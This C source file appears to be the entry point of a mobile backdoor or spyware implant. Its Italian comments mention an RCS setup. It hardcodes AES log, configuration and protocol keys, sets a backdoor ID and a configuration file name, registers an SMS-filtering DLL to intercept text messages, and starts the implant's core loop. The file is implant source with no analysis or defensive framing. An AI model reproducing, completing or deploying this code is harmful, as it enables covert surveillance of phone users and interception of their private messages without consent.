// Mornella Static
#include "Core.h"
#include <stdio.h>

int WINAPI main(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPTSTR lpCmdLine, int nCmdShow) {
	Core core;

	// RCS 40 su rcs-preprod
	BYTE LogKey[] = { 0x6b, 0x63, 0xc9, 0x11, 0xcf, 0xf4, 0xaa, 0xa5, 0x6e, 0xfb, 0x1f, 0xc9, 0xd1, 0x8a, 0x2d, 0x78 };

	BYTE ConfKey[] = { 0x30, 0x75, 0x2f, 0x17, 0x4f, 0x6f, 0xdc, 0xc6, 0xbb, 0x2f, 0x8a, 0x73, 0x4a, 0x1c, 0x0e, 0xc6 };

	// Sign sul DB
	BYTE ProtoKey[] = { 0x96, 0x77, 0x8a, 0xf9, 0x75, 0x6a, 0x30, 0x48, 0x9f, 0x64, 0x35, 0xbb, 0x06, 0x55, 0xee, 0xc2 };

	g_hInstance = hInstance;

	// Configurazione artificiale di alcune variabili
	ZeroMemory(g_AesKey, 32);
	ZeroMemory(g_Challenge, 32);
	ZeroMemory(g_ConfKey, 32);

	ZeroMemory(g_BackdoorID, 16);
	ZeroMemory(g_ConfName, 32 * sizeof(WCHAR));

	CopyMemory(g_AesKey, LogKey, 16);
	CopyMemory(g_Challenge, ProtoKey, 16);
	CopyMemory(g_ConfKey, ConfKey, 16);
	CopyMemory(g_BackdoorID, "RCS_0000000040", strlen("RCS_0000000xxx"));
	CopyMemory(g_ConfName, L"cptm511.dql", WideLen(L"cptm511.dql"));
	// Fine configurazione artificiale

	// Unregistriamo la DLL
	HMODULE hSmsFilter;

	// Installiamo la DLL del filtro SMS
	hSmsFilter = NULL;
	typedef HRESULT (*pRegister)();
	pRegister RegisterFunction;

	// Unregistriamo la DLL per il filtering degli SMS
	hSmsFilter = LoadLibrary(SMS_DLL);

	if (hSmsFilter != NULL) {
		RegisterFunction = (pRegister)GetProcAddress(hSmsFilter, L"DllRegisterServer");

		if (RegisterFunction != NULL) {
			RegisterFunction();
		}

		FreeLibrary(hSmsFilter);
	}
	//

	core.Run();

	return 0;
}
